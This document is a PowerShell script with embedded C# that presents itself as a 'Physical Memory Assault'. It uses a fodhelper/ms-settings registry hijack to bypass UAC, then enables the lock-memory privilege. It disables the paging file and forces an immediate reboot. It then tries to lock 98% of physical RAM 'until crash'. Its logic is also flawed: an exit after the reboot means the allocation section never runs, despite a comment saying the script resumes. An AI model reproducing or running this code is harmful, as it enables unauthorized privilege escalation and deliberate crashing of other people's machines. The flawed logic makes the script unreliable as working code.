# Self-elevate with UAC bypass
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $registryPath = "HKCU:\Software\Classes\ms-settings\shell\open\command"
    $scriptPath = "powershell.exe -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Definition)`""
    
    New-Item -Path $registryPath -Force | Out-Null
    Set-ItemProperty -Path $registryPath -Name "(Default)" -Value $scriptPath -Force
    Start-Process "fodhelper.exe" -WindowStyle Hidden
    Start-Sleep 2
    Remove-Item -Path $registryPath -Recurse -Force
    exit
}

# --- Kernel-Level Memory Locking ---
$tokenPrivileges = @"
using System;
using System.Runtime.InteropServices;

public class TokenManipulator {
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, int BufferLength, IntPtr PreviousState, IntPtr ReturnLength);
    
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
    
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out LUID lpLuid);

    [StructLayout(LayoutKind.Sequential)]
    public struct LUID {
        public uint LowPart;
        public int HighPart;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct TOKEN_PRIVILEGES {
        public int PrivilegeCount;
        public LUID Luid;
        public int Attributes;
    }

    public const int SE_PRIVILEGE_ENABLED = 0x00000002;
    public const uint TOKEN_QUERY = 0x00000008;
    public const uint TOKEN_ADJUST_PRIVILEGES = 0x00000020;
}
"@
Add-Type -TypeDefinition $tokenPrivileges

# Enable SeLockMemoryPrivilege
$hToken = [IntPtr]::Zero
[TokenManipulator]::OpenProcessToken((Get-Process -Id $PID).Handle, 
    [TokenManipulator]::TOKEN_ADJUST_PRIVILEGES -bor [TokenManipulator]::TOKEN_QUERY, [ref]$hToken) | Out-Null

$luid = New-Object TokenManipulator+LUID
[TokenManipulator]::LookupPrivilegeValue($null, "SeLockMemoryPrivilege", [ref]$luid) | Out-Null

$tp = New-Object TokenManipulator+TOKEN_PRIVILEGES
$tp.PrivilegeCount = 1
$tp.Luid = $luid
$tp.Attributes = [TokenManipulator]::SE_PRIVILEGE_ENABLED

[TokenManipulator]::AdjustTokenPrivileges($hToken, $false, [ref]$tp, 0, [IntPtr]::Zero, [IntPtr]::Zero) | Out-Null

# --- Physical Memory Assault ---
$memAllocCode = @"
using System;
using System.Runtime.InteropServices;

public class MemAllocator {
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
    public const uint MEM_COMMIT = 0x1000;
    public const uint MEM_RESERVE = 0x2000;
    public const uint MEM_LARGE_PAGES = 0x20000000;
    public const uint PAGE_READWRITE = 0x04;
}
"@
Add-Type -TypeDefinition $memAllocCode

# Calculate target memory (98% of physical RAM)
$physicalMem = (Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum
$targetMem = [math]::Floor($physicalMem * 0.98)
$chunkSize = 2MB  # Native large page size
$allocated = 0
$memoryBlocks = [System.Collections.Generic.List[IntPtr]]::new()

# Disable paging file and system protections
Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" -Name "PagingFiles" -Value "" -Force
Start-Process wmic -ArgumentList 'computersystem set AutomaticManagedPagefile=False' -NoNewWindow -Wait

# Force immediate reboot to apply settings
Start-Process shutdown -ArgumentList "/r /t 0 /f" -Wait
exit  # Script resumes after reboot

# --- Post-Reboot Execution ---
while ($allocated -lt $targetMem) {
    $ptr = [MemAllocator]::VirtualAlloc([IntPtr]::Zero, $chunkSize, 
        [MemAllocator]::MEM_COMMIT -bor [MemAllocator]::MEM_RESERVE -bor [MemAllocator]::MEM_LARGE_PAGES, 
        [MemAllocator]::PAGE_READWRITE)
    
    if ($ptr -eq [IntPtr]::Zero) {
        $chunkSize = [math]::Max($chunkSize / 2, 2MB)
        continue
    }
    
    # Force physical commitment
    [System.Runtime.InteropServices.Marshal]::WriteInt64($ptr, [DateTime]::Now.Ticks)
    $memoryBlocks.Add($ptr)
    $allocated += $chunkSize
}

# Maintain pressure until crash
while ($true) {
    [GC]::Collect()
    [GC]::WaitForPendingFinalizers()
    Start-Sleep -Seconds 3600
}
